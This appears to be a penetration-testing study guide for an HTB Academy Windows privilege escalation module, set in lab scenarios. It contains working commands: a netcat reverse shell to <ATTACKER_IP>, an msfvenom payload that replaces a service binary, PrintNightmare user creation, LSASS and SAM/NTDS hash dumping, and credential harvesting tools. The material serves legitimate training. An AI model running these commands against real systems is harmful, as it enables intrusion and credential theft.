# Windows Privilege Escalation

> HTB Academy — CPTS Path | Module: Windows Privilege Escalation
> Personal notes, corrected and expanded for the CPTS-Notes-and-Methodology repository.

## Table of Contents
1. [Overview](#overview)
2. [Enumeration](#enumeration)
   - [Network Information](#network-information)
   - [System Information](#system-information)
   - [Enumerating Network Services](#enumerating-network-services)
3. [Windows User Privileges](#windows-user-privileges)
   - [SeImpersonate & SeAssignPrimaryToken](#seimpersonate--seassignprimarytoken)
   - [SeDebugPrivilege](#sedebugprivilege)
   - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
4. [Windows Group Privileges](#windows-group-privileges)
   - [Backup Operators](#backup-operators)
   - [Event Log Readers](#event-log-readers)
   - [DnsAdmins](#dnsadmins)
   - [Print Operators](#print-operators)
   - [Server Operators](#server-operators)
5. [Attacking the OS](#attacking-the-os)
   - [User Account Control (UAC) Bypass](#user-account-control-uac-bypass)
   - [Weak Permissions](#weak-permissions)
   - [Kernel Exploits](#kernel-exploits)
   - [Vulnerable Services](#vulnerable-services)
   - [DLL Injection](#dll-injection)
6. [Credential Hunting](#credential-hunting)
7. [Restricted Environments](#restricted-environments)
8. [Skill Assessments](#skill-assessments)
9. [Additional Tools & Resources](#additional-tools--resources)
10. [Editorial Notes](#editorial-notes)

---

## Overview

The highest privilege level on a Windows host is:
```
NT AUTHORITY\SYSTEM
```

Common routes to escalate privileges on Windows include:
- Abusing Windows **group** privileges
- Abusing Windows **user** privileges
- Bypassing **User Account Control (UAC)**
- Abusing **weak service/file permissions**
- Leveraging **unpatched kernel exploits**
- **Credential theft**
- **Traffic capture**
- ...and more

We'll start with Windows user privileges, then move on to groups, OS-level attacks, and credential hunting.

---

## Enumeration

### Network Information

Check the current user:
```cmd
whoami
```

Get full network configuration (interfaces, internal ranges, etc.):
```cmd
ipconfig /all
```

List hosts that are up on the local network:
```cmd
arp -a
```

Show routing information:
```cmd
route print
```

Check Windows Defender status:
```powershell
Get-MpComputerStatus
```
Look for fields such as:
```
AntivirusEnabled          : True
AntivirusSignatureVersion : 1.333.1470.0
```

Enumerate AppLocker rules (which control what can/can't run):
```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```
Each rule will show either:
```
Action : Allow
Action : Deny
```

Test whether AppLocker allows a specific binary (e.g. `cmd.exe`) for a given user:
```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
```
Swap `-Path` and `-User` as needed.

### System Information

List running services and their owning process:
```cmd
tasklist /svc
```
Example output:
```
FileZilla Server.exe   1140   FileZilla Server
MsMpEng.exe            2136   WinDefend
```

Dump environment variables:
```cmd
set
```

Get full system information:
```cmd
systeminfo
```
Example output:
```
Host Name:   WINLPE-SRV01
OS Name:     Microsoft Windows Server 2016 Standard
OS Version:  10.0.14393 N/A Build 14393
```

List installed hotfix IDs (useful for finding missing patches later):
```cmd
wmic qfe
```
or, from PowerShell:
```powershell
Get-HotFix
```

List installed software:
```cmd
wmic product get name
```
Example output:
```
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
```

Same, with version numbers:
```powershell
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
```
> Note: `wmic` and `Win32_Product` only enumerate MSI-installed software, and `Win32_Product` is notoriously slow (it re-validates every installed MSI on query). For a faster/more complete picture, also check the registry uninstall keys:
> ```powershell
> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
> ```

List open ports:
```cmd
netstat -ano
```

List logged-in users and their session names:
```cmd
query user
```

Check the current user's privileges:
```cmd
whoami /priv
```

Check group memberships **and** privileges together:
```cmd
whoami /all
```

Or just group memberships:
```cmd
whoami /group
```

List all local users:
```cmd
net users
```

List all local groups (not just the ones you belong to):
```cmd
net localgroup
```

Get details/members of a specific group:
```cmd
net localgroup <GROUP_NAME>
```

Get the password policy:
```cmd
net accounts
```

### Enumerating Network Services

Start from open ports:
```cmd
netstat -ano
```
Example — a listening port worth investigating:
```
Proto   Local Address       Foreign Address    State        PID
TCP     0.0.0.0:49674       0.0.0.0:0          LISTENING    616
```

Match the PID to a process name:
```cmd
tasklist
```
Then look up PID `616` and identify which service it belongs to.

**Named pipes** are how local services communicate with each other — each service typically exposes its own pipe.

List named pipes with Sysinternals `pipelist`:
```cmd
pipelist.exe /accepteula
```
(Run it from the folder where the tool is located.)

Or list pipes from PowerShell:
```powershell
gci \\.\pipe\
```
Example output:
```
Winsock2\CatalogChangeListener-5e0-0     1     1
```

Check who has access to a specific pipe with Sysinternals `accesschk`:
```cmd
accesschk.exe /accepteula \\.\Pipe\<PIPE_NAME> -v
```
(Also run from the tool's folder.) If access is denied, try a different pipe.

---

## Windows User Privileges

Windows assigns **user rights / privileges** to accounts. Depending on which ones are enabled for the current user, different privilege-escalation paths become possible. Some examples:
```
SeNetworkLogonRight
SeRemoteInteractiveLogonRight
SeBackupPrivilege
SeSecurityPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
SeTcbPrivilege
```
The `Se` prefix stands for **Security**.

The four privileges most commonly abused in real engagements (and in exams) are:
```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeDebugPrivilege
SeTakeOwnershipPrivilege
```
If you find something outside this list, search for the specific privilege name plus "privilege escalation" — most have documented abuse techniques.

### SeImpersonate & SeAssignPrimaryToken

These are two of the most commonly abused privileges for privilege escalation, and they're exploited the same way.

A successful attack against either one gives **full SYSTEM/administrator** access. There are many ways to exploit `SeImpersonatePrivilege` — this walkthrough uses **JuicyPotato**, but tools like **RoguePotato**, **PrintSpoofer**, **GodPotato**, **SweetPotato**, and **EfsPotato** all abuse the same underlying issue (impersonating a privileged token via a COM/RPC coercion trick), and are generally the better choice on patched systems since JuicyPotato stopped working after certain Windows updates.

There's also a Metasploit-only path (shown below) using just `getsystem`.

**Scenario:**
```
User     : sql_dev
Password : Str0ng_P@ssw0rd!
IP       : 10.129.36.76
```

RDP (`xfreerdp`) is refused — this is an MSSQL service account, not an interactive login. Connect via `impacket-mssqlclient` instead:
```bash
impacket-mssqlclient sql_dev@10.129.36.76 -windows-auth
```
(`-windows-auth` because this is Windows/local authentication, not domain authentication.)

Check whether `xp_cmdshell` is usable:
```sql
xp_cmdshell whoami
```
Response:
```
nt service\mssql$sqlexpress01
```

Check privileges:
```sql
xp_cmdshell whoami /priv
```
Response includes:
```
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

#### Attack — Method 1: JuicyPotato

Check if JuicyPotato is already on the box:
```sql
xp_cmdshell dir C:\tools
```
If it isn't, upload it (or transfer it in via a reverse shell).

Start a listener on the attacker box:
```bash
nc -lnvp 8443
```

Trigger JuicyPotato:
```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -t *
```

Back on the attacker listener:
```cmd
whoami /all
```
The shell is now running as `NT AUTHORITY\SYSTEM`.

#### Attack — Method 2: Metasploit `getsystem`

From the attacker machine:
```bash
msfconsole
search smb delivery
use exploit/windows/smb/smb_delivery
options
set lhost tun0
set srvhost tun0
run
```
This hands you a one-liner command. Paste that command into whatever Windows shell you already have (in this scenario, the MSSQL `xp_cmdshell`).

Back in Metasploit, a new session should open:
```
sessions
sessions <session number>
```

Check current privileges:
```cmd
whoami /all
```
If they're still limited, background the shell:
```
exit
```
Back at the `meterpreter>` prompt, run:
```
getsystem
```
Meterpreter will try several known escalation techniques automatically (including named-pipe impersonation). Confirm:
```
getuid
```
You should now be `NT AUTHORITY\SYSTEM`.

### SeAssignPrimaryTokenPrivilege

Exploited the same way as `SeImpersonatePrivilege` above — same tools, same attack path.

### SeDebugPrivilege

A powerful privilege usually granted to developer/debugging accounts. It lets you attach to (and read the memory of) almost any process on the box — including `lsass.exe`, which holds credential material for every logged-on user.

**Scenario:**
```
User     : jordan
Password : HTB_@cademy_j0rdan!
IP       : 10.129.36.76
```

Connect via RDP and open `cmd`. `whoami /priv` from a normal shell may **not** show `SeDebugPrivilege` — open `cmd` as Administrator (right-click → *Run as administrator*) and check again; it should now be listed (whether it shows `Enabled` or `Disabled` doesn't matter — it can always be turned on programmatically).

#### Attack

From the attacker machine, get a shell using the same Metasploit `smb_delivery` technique as above:
```bash
msfconsole
search smb delivery
use exploit/windows/smb/smb_delivery
options
set lhost tun0
set srvhost tun0
run
```
Paste the resulting command into the target's `cmd`, then interact with the new session:
```
sessions
sessions <session number>
getuid
```
If you're not admin yet, list processes:
```
ps
```
Look for `lsass.exe` (or, if it's not listed/accessible, any other process running as a privileged user with a full path). Migrate into it:
```
migrate <PROCESS_PID>
```
Confirm:
```
getuid
```
You should now be SYSTEM/Administrator. Dump credentials:
```
hashdump
```
This pulls the local SAM hashes for every local account.

> **Tip:** if `hashdump` doesn't work well (e.g. against a domain controller), load Mimikatz through Meterpreter instead:
> ```
> load kiwi
> creds_all
> ```
> which also pulls cleartext credentials and Kerberos tickets, and on a DC can be used to DCSync.

### SeTakeOwnershipPrivilege

This privilege lets you become the **owner** of any file or object on the system — even ones you currently can't open. Ownership alone doesn't grant read access, though: after taking ownership you must also grant yourself permissions via `icacls`.

#### Attack

Connect via `xfreerdp` and confirm the privilege is present:
```cmd
whoami /priv
```
If it shows as `Disabled` (cosmetic only — it doesn't actually block the attack, but you can clean it up):
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```
(run each line separately, without the leading `>`)

Say we can't currently read `flag.txt`. Check who owns it:
```cmd
cmd /c dir /q 'C:\<FILE_PATH>'
```
If this fails, it usually means you don't even have list/read permission on the containing directory.

Take ownership:
```powershell
takeown /f 'C:\<FILE_PATH>'
```
You're now the owner, but you likely still can't read the file — grant yourself full control:
```cmd
icacls 'C:\<FILE_PATH>' /grant <USER_NAME>:F
```
Now read the file normally. This technique is especially useful against files that commonly contain credentials, e.g. `web.config`.

---

## Windows Group Privileges

### Backup Operators

The most important built-in group for privilege escalation. If `whoami /all` shows:
```
BUILTIN\Backup Operators
```
...you have several viable paths. The idea: members of this group can **back up** almost any file on disk (bypassing normal read ACLs), even though they may not be able to read those files directly. So: back the file up, then read the backup copy.

#### Attack steps

Check for the required DLLs (or transfer them over if missing):
```cmd
cd C:\Tools
dir
```
Looking for:
```
SeBackupPrivilegeUtils.dll
SeBackupPrivilegeCmdLets.dll
```
Import them:
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
If `SeBackupPrivilege` shows as disabled, enable it:
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Say we can't read:
```
C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
```
Back it up to our own directory and read the copy:
```powershell
Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
```
(`.\flag.txt` drops it in the current directory.)

#### Reading NTDS.dit / SAM on a Domain Controller

With `SeBackupPrivilege`, `diskshadow` lets you create a shadow copy of the whole `C:` volume — including files that are normally locked/inaccessible while Windows is running (like `ntds.dit`):
```powershell
diskshadow.exe
```
Then, inside the `DISKSHADOW>` prompt (one command per line):
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```
This exposes a snapshot of `C:` as drive `E:`.

Confirm:
```powershell
dir E:\
```

Back up the AD database:
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
`ntds.dit` alone isn't enough — it's encrypted with a key stored in the `SYSTEM` registry hive, so grab that too:
```powershell
Copy-FileSeBackupPrivilege E:\Windows\System32\config\SYSTEM C:\Tools\SYSTEM
```
Transfer both files to your attack box, then extract every domain account's NTLM hash (including `krbtgt`) with Impacket:
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
> This is effectively a local, credential-free equivalent of a DCSync — full domain compromise if you can reach a DC with Backup Operators rights.

### Event Log Readers

Not guaranteed to work, but worth checking. Members of this group can read the **Security** event log, which sometimes logs command lines (including credentials passed on the command line, e.g. `net use ... /user:...`) in cleartext.

Using `wevtutil`:
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
(`Select-String "/user"` filters for lines mentioning a username — swap in `pass` or similar for other hits.)

Example hit:
```
Process Command Line: net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

If `wevtutil` isn't available, use PowerShell directly against Event ID 4688 (process creation):
```powershell
Get-WinEvent -LogName security | Where-Object { $_.Id -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine'; expression={ $_.Properties[8].Value }}
```

### DnsAdmins

Members of this group can configure the DNS Server service. The DNS service loads a plugin DLL from a registry key at startup — `DnsAdmins` members can point that key at an arbitrary DLL, then restart the service to get it to load (and execute) that DLL as `SYSTEM`.

```cmd
dnscmd.exe /config /serverlevelplugindll C:\path\to\evil.dll
sc.exe stop dns
sc.exe start dns
```
> **Caveat:** restarting the DNS service usually requires local admin or `Server Operators` rights in addition to `DnsAdmins` — `DnsAdmins` membership alone sets up the primitive, but you may need a second privilege (or to wait for a scheduled reboot) to trigger it.

If you see:
```
Inlanefreight\DnsAdmins
```
in `whoami /all`, this is worth pursuing.

### Print Operators

One of the easier group-based escalations. Members of `Print Operators` are granted `SeLoadDriverPrivilege`, letting them **load kernel-mode drivers** — including a malicious one, which then runs with `SYSTEM`-level (kernel) privileges.

### Server Operators

Members can start, stop, and **reconfigure** Windows services on the box — even ones they don't own. The classic path is to repoint a service's binary path at an attacker command and restart it:
```cmd
sc.exe config <SERVICE_NAME> binpath= "cmd /c net localgroup administrators <USER> /add"
sc.exe stop <SERVICE_NAME>
sc.exe start <SERVICE_NAME>
```
(Or point `binpath=` at a reverse-shell payload instead.)

---

## Attacking the OS

### User Account Control (UAC) Bypass

Relies on a **vulnerable Windows build** rather than a specific privilege or group. The idea: you already have a full (non-elevated) token as a local user, but UAC is stopping you from actually using the admin rights that token contains.

Get the build number:
```powershell
[environment]::OSVersion.Version
```
Then search:
```
<BUILD_ID> UAC bypass
```
There are dozens of build-specific bypasses (`fodhelper.exe`, `eventvwr.exe`, `computerdefaults.exe`, `sdclt.exe`, DLL hijacks of auto-elevating binaries, etc.) — most rely on the same core idea: an auto-elevating binary that reads a registry key or DLL search path a standard user can control.

### Weak Permissions

Use **SharpUp** ([GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)) to check for common weak-permission issues:
```
AlwaysInstallElevated
CachedGPPPassword
DomainGPPPassword
HijackablePaths
McAfeeSitelistFiles
ModifiableScheduledTask
ModifiableServiceBinaries
ModifiableServiceRegistryKeys
ModifiableServices
ProcessDLLHijack
RegistryAutoLogons
RegistryAutoruns
TokenPrivileges
UnattendedInstallFiles
UnquotedServicePath
```
Run it:
```cmd
.\SharpUp.exe audit
```
Example hit — a modifiable service binary:
```
=== Modifiable Service Binaries ===

Name        : SecurityService
DisplayName : PC Security Management Service
Description : Responsible for managing PC security
State       : Stopped
StartMode   : Auto
PathName    : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
Confirm the weak ACL with `icacls`:
```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
If `Everyone` has `(F)` (full control):
```
BUILTIN\Users:(I)(F)
Everyone:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
...
Successfully processed 1 files; Failed processing 0 files
```
...you can overwrite the binary with your own payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<MY_IP> LPORT=<ANY_PORT> -f exe > SecurityService.exe
```
(The filename **must** match the original.) Host it, transfer it over, replace the original:
```cmd
copy <NEW_FILE_PATH> "<OLD_FILE_PATH>"
```
(confirm the overwrite when prompted). Start a listener on Kali:
```bash
nc -lnvp <SAME_PORT>
```
Start the service (note: it's `sc`, not `cs`):
```cmd
sc start <SERVICE_NAME>
```
(e.g. `sc start SecurityService`)

You should get a callback running as `SYSTEM`:
```cmd
whoami /all
```

> **Also worth running for this category:** `PowerUp.ps1` (PowerSploit), `PrivescCheck`, `Seatbelt`, and `winPEAS` all automate discovery of unquoted service paths, modifiable services, AlwaysInstallElevated, and stored credentials.

### Kernel Exploits

Get the base OS build:
```cmd
systeminfo | findstr /B /C:"OS Name" /B /C:"OS Version"
```

#### HiveNightmare / CVE-2021-36934

Also known as **SeriousSAM**. Affects systems where low-privileged users have read access to the `SAM` registry hive via shadow copies. Check permissions:
```cmd
icacls C:\Windows\System32\config\SAM
```
If `BUILTIN\Users` has any read access (`(RX)`), the box may be vulnerable — Windows periodically creates shadow copies that retain old (readable) ACLs.

Run the PoC (commonly shipped as `HiveNightmare.exe` or `CVE-2021-36934.exe`):
```
.\HiveNightmare.exe
```
Example output:
```
Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07
Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07
Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07
```
Then dump hashes offline:
```bash
secretsdump.py -sam SAM-2021-08-07 -security SECURITY-2021-08-07 -system SYSTEM-2021-08-07 LOCAL
```
Affects Windows 10 hosts where any user — even one with just read access to the registry — can trigger it.

#### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

Abuses `RpcAddPrinterDriver`, which lets a standard user interact with the Print Spooler in ways that were meant to require `SeLoadDriverPrivilege`.

Confirm the Spooler service is running:
```powershell
ls \\localhost\pipe\spoolss
```
Import the PoC and add a local admin:
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
Confirm:
```powershell
net user hacker
```
Look for:
```
Local Group Memberships     *Administrators
```

#### Enumerating Missing Patches

```powershell
wmic qfe list brief
systeminfo
Get-HotFix
```
(run each separately) Take any `HotFixID` you find and search for known privilege-escalation CVEs it's missing.

#### CVE-2020-0668

A Windows kernel elevation-of-privilege vulnerability caused by a weak ACL on a service-related file, exploitable via the `NtApiDotNet` library. If you find files like:
```
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```
...on the box, this is likely the intended path — see the [HTB Academy write-up](https://academy.hackthebox.com/app/module/67/section/627) for the full exploitation steps.

### Vulnerable Services

Enumerate installed software:
```cmd
wmic product get name
```
Check its version against known CVEs.

Enumerate a specific local port:
```cmd
netstat -ano | findstr 6064
```
Enumerate a process by PID:
```powershell
Get-Process -Id 3324
```
Enumerate running services:
```powershell
Get-Service | Where-Object {$_.DisplayName -like '*'}
```

### DLL Injection

Not heavily tested on the CPTS exam and not covered hands-on in this module — worth reading up on separately if you have time. Classic idea: plant a malicious DLL on a process's DLL search path, or hijack a `LoadLibrary` call in a service/application that runs with higher privileges than you.

---

## Credential Hunting

Often the easiest and fastest path — plain old **looking for passwords people left lying around**.

### Application Configuration Files

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Swap `"password"` for other likely terms (`pwd`, `pass`, `secret`, `key`, `connectionstring`...).

### Dictionary Files

Custom spell-check dictionaries sometimes retain typed passwords:
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### PowerShell History

```powershell
cd C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Or, if you don't remember the exact path:
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```
Look through for anything that looks like a credential or connection string.

### Other Files Worth Searching

[InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/) is one of the best references for this — both Windows and Linux.

Search everything for the word "password":
```cmd
findstr /spin "password" *.*
```
(noisy — expect a lot of false positives)

Search for config files system-wide:
```cmd
where /R C:\ *.config
```
(these often hold real credentials — e.g. `C:\inetpub\wwwroot\web.config`)

Search for specific interesting extensions:
```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

Check Sticky Notes (a very common place people jot down passwords):
```powershell
cd C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```
(the exact path can vary — browse manually if this doesn't exist) Copy it out and pull it apart on Kali (`sqlite3 plum.sqlite` or similar) rather than fighting with it on Windows.

Other files worth checking manually:
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

### Automating Credential Theft

#### Saved Credentials (`cmdkey`)

```cmd
cmdkey /list
```
Example:
```
Target: LegacyGeneric:target=TERMSRV/SQL01
Type:   Generic
User:   inlanefreight\bob
```
Reuse a saved credential without ever seeing it in plaintext:
```cmd
runas /savecred /user:inlanefreight\bob "dir"
```
(only works if that credential was previously stored with `/savecred` by that user — it won't decrypt an arbitrary saved credential for you.)

#### Browser Credentials

Manually: Chrome → Settings → Autofill → Passwords.

Without GUI access, use **SharpChrome**:
```powershell
.\SharpChrome.exe logins /unprotect
```

#### Password Managers (KeePass)

Search for KeePass databases:
```powershell
where /R c:\ *.kdbx
```
Pull the file down and crack it offline with `keepass2john` + `hashcat`:
```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```
```bash
hashcat -m 13400 <keepass_hash> /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```
(mode `13400` covers both KeePass 1 AES/Twofish and KeePass 2 AES databases)

#### LaZagne

One of the best automated credential-hunting tools — extracts saved credentials from browsers, WiFi, mail clients, and dozens of other applications.
```powershell
.\lazagne.exe -h
.\lazagne.exe all
```

#### SessionGopher

Pulls saved sessions (PuTTY, WinSCP, RDP, FileZilla, etc.):
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

#### Windows AutoLogon

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
Look for `DefaultUserName` / `DefaultPassword` (or `DefaultDomainName`).

#### PuTTY Saved Sessions

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```
Example:
```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```
Then:
```powershell
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh"
```
(saved passwords are usually stored obfuscated rather than in cleartext, but host/username/proxy fields are still worth checking)

#### WiFi Passwords

People reuse passwords — a saved WiFi PSK is sometimes also the local admin password.
```cmd
netsh wlan show profile
netsh wlan show profile <WIFI_NAME> key=clear
```
(or pull them all at once with `lazagne.exe wifi`)

---

## Restricted Environments

### Citrix Breakout — Bypassing Path Restrictions

If you're dropped into a restricted Citrix/kiosk-style session where navigating directly to a path (e.g. `C:\Users`) is blocked, try going through a UNC path instead:
```
\\127.0.0.1\c$\users
```
Or, from any app's File → Open dialog, browse to *Network*, then to the local host as a client, and type the target path directly into the filename box:
```
\\127.0.0.1\c$\users\<UserName>
```
If that's also blocked, try changing the **save location** rather than the filename itself.

---

## Skill Assessments

### Skill Assessment 1

**Given:**
```
IP: 10.129.225.46
```

Scan the host:
```bash
nmap 10.129.225.46 -Pn
```
Result: a web application and RDP, no credentials.

The web app has an input field vulnerable to OS command injection:
```
127.0.0.1 && whoami
```
Response confirms it:
```
iis apppool\defaultapppool
```

Get a shell via Metasploit's `smb_delivery`:
```bash
msfconsole
search smb del
use exploit/windows/smb/smb_delivery
set srvhost tun0
set lhost tun0
run
```
Paste the resulting command into the vulnerable input field.

Interact with the resulting session:
```
sessions 1
ps
migrate 964
shell
```
(`964` was chosen because it belonged to `w3wp.exe` — a stable, appropriately-privileged process to migrate into.)

Check privileges:
```cmd
cd C:\
whoami /all
```
Notable finding:
```
SeImpersonatePrivilege   Enabled
```

Back out to Meterpreter:
```
exit
```
Try the built-in escalation first:
```
getsystem
```
If that fails, download **GodPotato** (search `GodPotato Github`), upload it, and run it manually:
```
cd C:/programdata
upload ~/Downloads/GodPotato-NET4.exe
shell
```
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```
If that still fails, try migrating into a different/higher-privileged process (`lsass.exe` if reachable) or swap in JuicyPotato/PrintSpoofer as alternatives to get a SYSTEM shell.

### Skill Assessment 2

**Given:**
```
User:     htb-student
Password: HTB_@cademy_stdnt!
IP:       10.129.43.33
```

> ⚠️ **Notes incomplete** — the original notes cut off here (referencing the final module video around 20:30). Send the rest of this walkthrough and it'll be filled in properly rather than guessed at.

---

## Additional Tools & Resources

Tools not mentioned above that are worth having in your toolkit for Windows privilege escalation:

- **winPEAS** — broad automated enumeration (services, registry, files, credentials, AV/AppLocker status).
- **PowerUp.ps1** (PowerSploit) / **PrivescCheck** — PowerShell-based checks for weak services, unquoted paths, DLL hijacks, AlwaysInstallElevated, etc.
- **Seatbelt** — C# host-survey tool; good for a broad, fast enumeration pass.
- **Mimikatz** — credential dumping from LSASS memory (`sekurlsa::logonpasswords`), SAM (`lsadump::sam`), and more; usually needs `SeDebugPrivilege` (or SYSTEM) to touch LSASS directly.
- **Rubeus** — Kerberos abuse (ticket requests, Kerberoasting, ASREPRoasting) — more relevant once pivoting toward AD, but worth knowing about at this stage too.
- **PrintSpoofer / RoguePotato / GodPotato / SweetPotato / EfsPotato** — modern alternatives to JuicyPotato for `SeImpersonatePrivilege` abuse; try these first on Server 2019+ / recently patched boxes, since JuicyPotato itself is patched on most current builds.
- **accesschk.exe** (Sysinternals) — not just for pipes; also great for auditing file, registry, and service ACLs broadly (e.g. `accesschk.exe -uwcqv <group> *` for services).

**References:**
- [HTB Academy — Windows Privilege Escalation module](https://academy.hackthebox.com/module/67)
- [InternalAllTheThings — Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)
- [GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)

---

## Editorial Notes

Corrections made while cleaning up the original notes, flagged here so nothing gets silently lost:

- `net localgtoup` → `net localgroup` (typo).
- `cs start <service>` → `sc start <service>` (Service Control command — `cs` isn't a real Windows command).
- `SeAssignPrimaryToken` → `SeAssignPrimaryTokenPrivilege` (correct full privilege name).
- The `ntds.dit` extraction section now also grabs the `SYSTEM` hive and uses `secretsdump.py` to actually decrypt/dump the hashes — pulling `ntds.dit` alone isn't enough on its own.
- DnsAdmins section now includes the actual `dnscmd`/`sc` commands plus the caveat that restarting the DNS service usually needs a second privilege beyond group membership.
- Server Operators section now includes a concrete `sc config` example rather than just describing the concept.
- Skill Assessment 2 is left incomplete rather than filled in with guesses — the source notes cut off mid-sentence.
